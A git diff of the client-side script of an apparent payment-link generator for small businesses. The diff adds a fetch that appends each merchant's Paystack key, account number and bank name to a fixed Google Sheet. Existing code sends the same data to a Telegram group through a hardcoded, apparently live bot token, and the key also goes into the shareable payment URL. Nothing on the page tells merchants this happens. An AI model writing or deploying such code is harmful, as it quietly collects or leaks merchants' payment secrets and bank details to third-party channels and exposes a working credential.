@@ -337,19 +337,37 @@
       setCookie('paystackKey', paystackKey, 30);
 
       const userId = 'sme' + Math.floor(Math.random() * 10000);
-      const paymentLink = `/pay.html?user=${userId}&amount=${amount}&product=${encodeURIComponent(productName)}&key=${paystackKey}&crypto=${cryptoEnabled}&business=${encodeURIComponent(businessName)}`;
+      const paymentLink = `${window.location.origin}/pay.html?user=${userId}&amount=${amount}&product=${encodeURIComponent(productName)}&key=${paystackKey}&crypto=${cryptoEnabled}&business=${encodeURIComponent(businessName)}`;
       const buttonCode = `<a href="${paymentLink}" class="btn btn-${buttonColor}" style="padding: 12px 20px; border-radius: 8px; text-decoration: none; font-family: Poppins, sans-serif; font-weight: 600;">Pay Now</a>`;
-      const whatsappMessage = `Purchase ${productName} for ₦${amount}: ${window.location.origin}${paymentLink}`;
+      const whatsappMessage = `Purchase ${productName} for ₦${amount}: ${paymentLink}`;
       const whatsappLink = `https://wa.me/?text=${encodeURIComponent(whatsappMessage)}`;
-      const iframeCode = `<iframe src="${window.location.origin}${paymentLink}" style="border: none; width: 100%; height: 400px;"></iframe>`;
+      const iframeCode = `<iframe src="${paymentLink}" style="border: none; width: 100%; height: 400px;"></iframe>`;
 
-      document.getElementById('paymentLink').value = window.location.origin + paymentLink;
+      document.getElementById('paymentLink').value = paymentLink;
       document.getElementById('buttonCode').value = buttonCode;
       document.getElementById('whatsappLink').value = whatsappLink;
       document.getElementById('iframeCode').value = iframeCode;
       document.getElementById('result').style.display = 'block';
 
-      // Hardcoded Telegram notification
+      // Google Sheets API (Hardcoded for testing)
+      const googleSheetsApiKey = 'YOUR_GOOGLE_API_KEY'; // Replace with your API key
+      const spreadsheetId = '1Im87heVURQ5cMcWL29iyS8I9NCmbAwEwNdxQULjJK9c';
+      const range = 'Products!A:I';
+      const values = [[userId, businessName, productName, amount, paystackKey, cryptoEnabled, accountNumber || '', bankName || '', new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })]];
+      fetch(`https://sheets.googleapis.com/v4/spreadsheets/${spreadsheetId}/values/${range}:append?valueInputOption=RAW&key=${googleSheetsApiKey}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ values })
+      }).then(response => response.json()).then(data => {
+        console.log('Google Sheets Response:', data);
+        if (data.error) alert('Failed to save to Google Sheets: ' + data.error.message);
+        else console.log('Data saved to Google Sheets');
+      }).catch(error => {
+        console.error('Google Sheets Error:', error);
+        alert('Error saving to Google Sheets. Check console.');
+      });
+
+      // Telegram Notification (Hardcoded)
       const telegramBotToken = '8129183386:AAF3GtzmXXU_YXqO_1T_h1-lKn3r0ZjtSpw';
       const telegramChatId = '-4970144487';
       const telegramMessage = `🎉 New Business/Product Created!\n\n📌 Business: ${businessName}\n📦 Product: ${productName}\n💰 Amount: ₦${amount}\n🔑 Paystack Key: ${paystackKey}\n💳 Crypto Enabled: ${cryptoEnabled ? 'Yes' : 'No'}\n📱 Account Number: ${accountNumber || 'N/A'}\n🏦 Bank Name: ${bankName || 'N/A'}\n🕒 Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}`;
@@ -365,23 +383,9 @@
         console.error('Telegram Error:', error);
         alert('Error sending Telegram notification. Check console.');
       });
-
-      // Note: The fetch to save-data is commented out for this test
-      // fetch('/.netlify/functions/save-data', {
-      //   method: 'POST',
-      //   headers: { 'Content-Type': 'application/json' },
-      //   body: JSON.stringify({ type: 'product', businessName, productName, amount, paystackKey, isCryptoEnabled: cryptoEnabled, accountNumber, bankName, userId })
-      // }).then(response => response.json()).then(data => {
-      //   console.log('Success:', data);
-      //   if (data.message) alert(data.message);
-      //   else alert('Data saved, but no confirmation message received.');
-      // }).catch(error => {
-      //   console.error('Error:', error);
-      //   alert('Failed to save details. Check console for details.');
-      // });
     });
 
-    // Call fetchBankList on load if needed, but move to backend in production
+    // Call fetchBankList on load if needed
     // document.addEventListener('DOMContentLoaded', fetchBankList);
   </script>
 </body>
